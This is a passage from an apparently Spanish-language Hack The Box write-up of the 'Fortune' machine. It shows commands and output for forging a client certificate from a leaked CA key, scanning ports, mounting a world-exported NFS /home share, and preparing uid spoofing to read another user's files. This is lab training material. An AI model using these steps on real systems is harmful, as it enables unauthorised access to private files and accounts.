&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/home/bob
├── ca
│   ├── certs
│   │   └── ca.cert.pem
│   ├── crl
│   ├── index.txt
│   ├── index.txt.attr
│   ├── index.txt.old
│   ├── intermediate
│   │   ├── certs
│   │   │   ├── ca-chain.cert.pem
│   │   │   ├── fortune.htb.cert.pem
│   │   │   └── intermediate.cert.pem
│   │   ├── crl
│   │   ├── crlnumber
│   │   ├── csr
│   │   │   ├── fortune.htb.csr.pem
│   │   │   └── intermediate.csr.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── private
│   │   │   ├── fortune.htb.key.pem
│   │   │   └── intermediate.key.pem
│   │   ├── serial
│   │   └── serial.old
│   ├── newcerts
│   │   └── 1000.pem
│   ├── openssl.cnf
│   ├── private &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;error opening dir&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
│   ├── serial
│   └── serial.old
└── dba
    └── authpf.sql
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.certsuperior.com/QueesunCertificadoSSL.aspx&#34;&gt;&lt;strong&gt;certsuperior - Certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/bncbs/index.html&#34;&gt;&lt;strong&gt;Oracle - certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/images/security-sslBMAWithCertificates.gif&#34; alt=&#34;IMAGE&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder acceder a la pagina debemos de crear nuestro archivo &lt;code&gt;pkc12&lt;/code&gt; el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos &lt;code&gt;intermediate.cert.pem&lt;/code&gt; e &lt;code&gt;intermediate.key.pem&lt;/code&gt;, utilizando openssl generamos el certificado con el siguiente comando:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ssl.com/how-to/create-a-pfx-p12-certificate-file-using-openssl/&#34;&gt;&lt;strong&gt;ssl - Certificate File&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html&#34;&gt;&lt;strong&gt;ibm - Certificate&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2017-26-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-31-53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos la pagina en https y nos muestra lo siguiente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-33-16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-34-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina &lt;code&gt;/generate&lt;/code&gt; nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-35-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos conectamos al servicio ssh con la clave generada y el usuario &lt;code&gt;nfsuser&lt;/code&gt;, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-31-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar los procesos que corren en la maquina nos muestra un servicio de &lt;strong&gt;authpf&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-37-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun la documentacion de openbsd sobre Authpf nos dice que &lt;strong&gt;&amp;ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que &amp;ldquo;los usuarios se deben autenticar ante la pasarela&amp;rdquo; antes de que se permita que pase el tráfico a través de ésta&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.openbsd.org/faq/pf/authpf.html#loginclass&#34;&gt;&lt;strong&gt;openbsd - authpf&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://home.nuug.no/~peter/pf/blug2011/authpf.html&#34;&gt;&lt;strong&gt;autphf - español&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Las reglas de authpf &lt;code&gt;/etc/authpf/authpf.rules&lt;/code&gt; nos muestran que cualquier usuario ip (&lt;code&gt;$user_ip&lt;/code&gt;) en este caso &lt;code&gt;nfsuser&lt;/code&gt; le de paso o permiso en los protocolos tcp udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ext_if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;em0&amp;#34;&lt;/span&gt;
pass in quick on &lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt; inet proto &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; tcp udp &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; from &lt;span class=&#34;nv&#34;&gt;$user_ip&lt;/span&gt; to &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; keep state
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-21 04:58 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;994&lt;/span&gt; closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http       OpenBSD httpd
111/tcp  open  rpcbind    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
443/tcp  open  ssl/https?
2049/tcp open  nfs        2-3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100003)&lt;/span&gt;
8081/tcp open  http       OpenBSD httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 38.31 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio &lt;code&gt;rpcbind&lt;/code&gt;:&lt;/p&gt;
&lt;h2 id=&#34;rpcbind&#34;&gt;RPCBIND&lt;/h2&gt;
&lt;p&gt;Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127
   program vers proto   port  service
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;p&gt;Al revisar los puntos compartidos obtenemos que &lt;code&gt;/home&lt;/code&gt; puede ser montado&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# showmount -e 10.10.10.127
Export list &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127:
/home &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;everyone&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;acceso-a-home&#34;&gt;ACCESO a /home&lt;/h2&gt;
&lt;p&gt;Para acceder a la carpeta &lt;code&gt;/home&lt;/code&gt; debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;root@sckull:~/htb/fortune# mkdir tmp_nfs
root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs
root@sckull:~/htb/fortune# ls tmp_nfs/
bob  charlie  nfsuser
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y &lt;strong&gt;nfsuser:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/
total 16K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 02:39 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 01:19 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;771&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cshrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cvsrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;359&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .login
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;175&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .mailrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;215&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .profile
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;87&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .Xdefaults
root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/
ls: cannot open directory &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_nfs/charlie/&amp;#39;&lt;/span&gt;: Permission denied
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que &lt;code&gt;/home/charlie&lt;/code&gt; tiene propiedades &lt;code&gt;uid: 1000 y gid:1000&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# stat tmp_nfs/charlie/
  File: tmp_nfs/charlie/
  Size: &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;       	Blocks: &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;          IO Block: &lt;span class=&#34;m&#34;&gt;32768&lt;/span&gt;  directory
Device: 31h/49d	Inode: &lt;span class=&#34;m&#34;&gt;27648&lt;/span&gt;       Links: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
Access: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0750/drwxr-x---&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  Uid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   Gid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Access: 2019-03-21 05:17:35.827314870 +0000
Modify: 2019-03-21 05:33:05.655948328 +0000
Change: 2019-03-21 05:33:05.655948328 +0000
 Birth: -
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un usuario y grupo local para charlie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
